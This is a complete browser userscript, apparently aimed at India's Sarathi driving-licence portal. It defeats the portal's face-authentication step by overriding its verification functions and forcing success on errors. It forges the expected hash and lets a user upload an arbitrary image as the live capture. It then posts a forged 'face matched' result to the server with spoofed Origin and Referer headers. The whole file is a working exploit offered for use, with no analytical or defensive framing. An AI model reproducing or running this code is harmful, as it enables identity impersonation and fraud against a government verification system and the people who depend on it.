(function () {
    'use strict';

    function showToast(msg, type) {
        type = type || "success";
        var box = document.getElementById("faceAuthToastBox");
        if (!box) {
            box = document.createElement("div");
            box.id = "faceAuthToastBox";
            Object.assign(box.style, {
                position: "fixed", top: "20px", right: "20px",
                zIndex: "999999", display: "flex", flexDirection: "column",
                gap: "10px", pointerEvents: "none"
            });
            document.body.appendChild(box);
        }
        var colors = {
            success: { bg: "#0f0", color: "#000", border: "#090" },
            error:   { bg: "#f44336", color: "#fff", border: "#900" },
            info:    { bg: "#00c2ff", color: "#fff", border: "#005f80" },
            warn:    { bg: "#ffcc00", color: "#000", border: "#990" }
        };
        var c = colors[type] || colors.info;
        var toast = document.createElement("div");
        toast.innerText = msg;
        Object.assign(toast.style, {
            background: c.bg, color: c.color,
            border: "2px solid " + c.border,
            padding: "12px 18px", borderRadius: "8px",
            fontWeight: "bold", fontFamily: "Arial, sans-serif",
            fontSize: "14px", boxShadow: "0 4px 12px rgba(0,0,0,0.3)",
            opacity: "0", transform: "translateX(100%)",
            transition: "all 0.3s ease", pointerEvents: "auto"
        });
        box.appendChild(toast);
        requestAnimationFrame(function () {
            toast.style.opacity = "1";
            toast.style.transform = "translateX(0)";
        });
        setTimeout(function () {
            toast.style.opacity = "0";
            toast.style.transform = "translateX(100%)";
            setTimeout(function () { toast.remove(); }, 300);
        }, 3000);
    }

    var faceAuthInitialized = false;

    function initFaceAuthOverride() {
        console.log("🔧 Selective FaceAuth override initialized");
        var wait = setInterval(function () {
            if (typeof window.faceAuthStatus === "function") {
                clearInterval(wait);
                overrideFaceAuthFunctions();
            }
        }, 300);
    }

    function overrideFaceAuthFunctions() {
        console.log("✅ Overriding FaceAuth functions");
        window.putBacktophotoUpload = function () {
            console.log("⛔ putBacktophotoUpload blocked");
            return true;
        };
        var originalFaceAuthStatus = window.faceAuthStatus;
        window.faceAuthStatus = async function () {
            console.log("🔄 faceAuthStatus overridden");
            try {
                var result = await originalFaceAuthStatus.apply(this, arguments);
                console.log("faceAuthStatus original completed");
                return result;
            } catch (e) {
                console.log("faceAuthStatus bypassed");
                return true;
            }
        };
        console.log("✅ All overrides active");
        faceAuthInitialized = true;
    }

    initFaceAuthOverride();

    async function hashSHA256(str) {
        var encoder = new TextEncoder();
        var data = encoder.encode(str);
        var hashBuffer = await crypto.subtle.digest("SHA-256", data);
        var hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
    }

    async function runFaceAuth() {
        if (!document.body) return;
        var pageText = document.body.innerText;
        if (!pageText.includes("Authenticate") && !pageText.includes("Proceed")) return;
        if (window.faceAuthRun) return;
        window.faceAuthRun = true;
        console.log("✅ Required text detected. Running script...");
        var llappln = (document.querySelector('[name="llappln"]') || {}).value || '';
        var entcaptxt = (document.querySelector('[name="entcaptxt"]') || {}).value || '';
        llappln = llappln.trim();
        entcaptxt = entcaptxt.trim();
        if (!llappln || !entcaptxt) {
            console.error("❌ llappln or entcaptxt missing");
            return;
        }
        var combinedString = llappln + entcaptxt;
        console.log("🔹 Combined String:", combinedString);
        try {
            var hash = await hashSHA256(combinedString);
            console.log("🔐 Generated Hash:", hash);
            var response = await fetch("faceAuthStatus.do", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: "faceAuthStatus=" + encodeURIComponent(hash)
            });
            var resultText = await response.text();
            console.log("✅ Server Response:", resultText);
        } catch (error) {
            console.error("❌ Error:", error);
        }
    }

    setInterval(runFaceAuth, 500);

    function displayApplimg() {
        if (window.applimg) {
            var existingImg = document.getElementById('applimgDisplay');
            if (existingImg) existingImg.remove();
            var img = document.createElement('img');
            img.id = 'applimgDisplay';
            img.src = window.applimg;
            Object.assign(img.style, {
                position: 'fixed', bottom: '175px', left: '20px',
                maxWidth: '100px', border: '2px solid #0f0', zIndex: '99999'
            });
            document.body.appendChild(img);
        } else {
            showToast('applimg not found or empty.', 'warn');
        }
    }

    window.addEventListener('load', function () {
        var fetchBtn = document.createElement('button');
        fetchBtn.innerText = "📥 Fetch Image";
        Object.assign(fetchBtn.style, {
            position: 'fixed', bottom: '70px', left: '20px',
            padding: '10px 16px', background: '#ffcc00', color: 'black',
            fontWeight: 'bold', border: '2px solid #999',
            borderRadius: '8px', cursor: 'pointer', zIndex: 99999
        });
        fetchBtn.title = "Click to fetch and display applimg";
        document.body.appendChild(fetchBtn);
        fetchBtn.addEventListener('click', function () { displayApplimg(); });

        var sendBtn = document.createElement('button');
        sendBtn.innerText = "🚀 Send";
        Object.assign(sendBtn.style, {
            position: 'fixed', bottom: '20px', left: '20px',
            padding: '10px 16px', background: '#00c2ff', color: 'white',
            fontWeight: 'bold', border: '2px solid rgb(0 29 81)',
            borderRadius: '8px', cursor: 'pointer', zIndex: 99999
        });
        sendBtn.title = "Click to send data manually";
        document.body.appendChild(sendBtn);

        sendBtn.addEventListener("click", function () {
            var interval = setInterval(function () {
                var target = document.getElementById("capphto1");
                if (target) {
                    target.disabled = false;
                    target.removeAttribute("disabled");
                    clearInterval(interval);
                    console.log("capphto1 enabled");
                }
            }, 300);
        });

        sendBtn.addEventListener("click", async function () {
            console.log("🔄 Send button clicked...");
            if (!window.applimg) {
                showToast('Image data (applimg) not found!', 'warn');
                return;
            }
            var applnoEl = document.getElementById('llappln');
            var rtocodeEl = document.getElementById('rtocode');
            var applno = applnoEl ? applnoEl.value : '';
            var rtocode = rtocodeEl ? rtocodeEl.value : '';
            var capPho = window.applimg;
            if (!applno || !rtocode || !capPho) {
                showToast('Missing required fields!', 'error');
                return;
            }
            (async function restoreOriginalFlow() {
                console.log("Restoring original face-aware flow");
                if (typeof faceAuthStatus === "function") {
                    try {
                        await faceAuthStatus();
                        console.log("faceAuthStatus completed");
                    } catch (e) {
                        console.error("faceAuthStatus failed:", e);
                    }
                }
            })();
            var data = new URLSearchParams();
            data.append("applno", applno);
            data.append("rtocode", rtocode);
            data.append("faceres", "1");
            data.append("CapPho", capPho);
            try {
                var response = await fetch("/sarathiservice/saveFaceAuthData.do", {
                    method: "POST",
                    credentials: "same-origin",
                    headers: {
                        "Accept-Language": "en-US,en;q=0.9",
                        "X-Requested-With": "XMLHttpRequest",
                        "Accept": "/",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Origin": "https://sarathi.parivahan.gov.in",
                        "Referer": "https://sarathi.parivahan.gov.in/sarathiservice/stallexamaction.do"
                    },
                    body: data.toString()
                });
                var json = await response.json();
                console.log("✅ Server Response:", json);
                var oldBox = document.getElementById("customResponseBox");
                if (oldBox) oldBox.remove();
                var pre = document.createElement("pre");
                pre.id = "customResponseBox";
                Object.assign(pre.style, {
                    position: 'fixed', bottom: '70px', right: '20px',
                    maxHeight: '300px', overflow: 'auto', background: '#111',
                    color: '#0f0', padding: '10px', zIndex: 99999,
                    border: '2px solid #0f0'
                });
                pre.innerText = JSON.stringify(json, null, 2);
                document.body.appendChild(pre);
                showToast('Request sent successfully!', 'success');
            } catch (e) {
                console.error("❌ Send failed:", e);
                showToast('Send failed: ' + e.message, 'error');
            }
        });

        var uploadBtn = document.createElement('button');
        uploadBtn.innerText = '📤 Upload Image';
        Object.assign(uploadBtn.style, {
            position: 'fixed', bottom: '120px', left: '20px',
            padding: '10px 16px', background: '#4CAF50', color: 'white',
            fontWeight: 'bold', border: '2px solid #999',
            borderRadius: '8px', cursor: 'pointer', zIndex: 99999
        });
        uploadBtn.title = "Click to select and upload an image";

        var fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.accept = 'image/*';
        fileInput.style.display = 'none';

        document.body.appendChild(fileInput);
        document.body.appendChild(uploadBtn);

        uploadBtn.addEventListener('click', function () { fileInput.click(); });

        fileInput.addEventListener('change', function () {
            var file = fileInput.files[0];
            if (!file) return;
            var reader = new FileReader();
            reader.onload = function () {
                window.applimg = reader.result;
                showToast('Image uploaded successfully!', 'success');
                displayApplimg();
            };
            reader.readAsDataURL(file);
        });
    });
})();
